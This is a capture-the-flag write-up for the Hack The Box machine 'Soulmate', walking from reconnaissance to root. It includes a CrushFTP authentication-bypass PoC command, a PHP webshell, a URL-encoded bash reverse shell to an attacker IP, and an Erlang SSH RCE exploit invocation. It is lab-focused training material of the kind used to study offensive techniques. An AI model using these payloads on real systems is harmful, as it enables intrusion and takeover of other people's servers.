The first step is an Nmap scan to see which services are exposed: 
<br>
`nmap -sC -sV 10.10.11.86 -oA Soulmate_NMAP`

```

<br><br>
And we get port 80 being open, with a redirect to **soulmate.htb** so its time to add that to /etc/hosts

![main webpage](/assets/images/thumbnails/htb/ctf/soulmate/webpage.png)

<br><br>
From there I see the option to make an account with the option to upload a profile picture image.

![Image of account creation](/assets/images/thumbnails/htb/ctf/soulmate/signup.png)

<br><br>
So naturally I open burpsuite and see the post request that its making

![Burpsuite](/assets/images/thumbnails/htb/ctf/soulmate/burpsuite.png)

<br><br>

# Directory and Vhost Discovery

And experiment with uploading things that should be there, and pretty easily find that you can change the content type and upload a PHP file (Keep this in mind for later)

<br>
Then from there i run:
- Feroxbuster to find directories
- ffuf for subdomains and vhosts

![FFUF screenshot](/assets/images/thumbnails/htb/ctf/soulmate/ffuf_vhost.png)

<br><br>
and I find a vhost at
`ftp.soulmate.htb`

So we also add this too /etc/hosts

![CrushFTP Image](/assets/images/thumbnails/htb/ctf/soulmate/ftp_vhost.png)

<br><br>

# CrushFTP Exploit (CVE-2025-31161)

From there we can see that theyre using CrushFTP and although I wasnt able to find out what version, I did come across a recent CVE for this application (CVE-2025-31161) which:

By knowing a valid username (like crushadmin), an attacker can trick the server into logging them in without a password. Once in, they can create a new user with their own password and use that for persistent access.

Then from there I found a [PoC from Immersive Labs](`https://github.com/Immersive-Labs-Sec/CVE-2025-31161`)

`python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user admin --password 'admin'`

<br><br>
Looking around the dashboard, I came across this page

`http://ftp.soulmate.htb/WebInterface/UserManager/index.html`

<br>
In which I was able to give myself permissions to upload to the paths listed there. with /app being the main one here

![File permissions](/assets/images/thumbnails/htb/ctf/soulmate/file_permissions.png)

<br><br>
After looking through /app I was led to `Home -> webProd -> assets -> images -> profiles` and would you know it, this is where the images get uploaded to.
And I am able to access this page, so if I upload 

`<?php system($_GET["cmd"]); ?>`

And access it with

`http://soulmate.htb/assets/images/profiles/Test1.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.189/4444+0%3E%261%27`



![Images directory](/assets/images/thumbnails/htb/ctf/soulmate/images_path.png)

<br><br>
`www-data@soulmate:/$` 
<br><br><br>
I get a shell

Now from here during my enumeration I come across

```

<br><br>
With an ssh server running locally on port 2222
I searched for vulnerabilities affecting Erlang SSH.

`https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC/blob/main/cve-2025-32433.py`

`python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.14.189 --lport 6666`

```

root
```

<br><br>
and we're done! (I promise you this isnt a TTY, I didnt just write this)

<br>

# Conclusion / TL;DR

- **Recon**: Nmap revealed SSH (22) and HTTP (80) with a redirect to soulmate.htb.
<br><br>

- **Web app**: Account creation with an insecure image upload allowed PHP files.
<br><br>

- **Discovery**: ffuf found ftp.soulmate.htb, running CrushFTP.
<br><br>

- **Exploit**: Used CVE-2025-31161 to bypass auth and create my own account.
<br><br>

- **Persistence**: Granted myself upload permissions and dropped a PHP webshell.
<br><br>

- **Enumeration**: Found Erlang SSH running on localhost port 2222.
<br><br>

- **Privilege Escalation**: Exploited CVE-2025-32433 to gain root access.
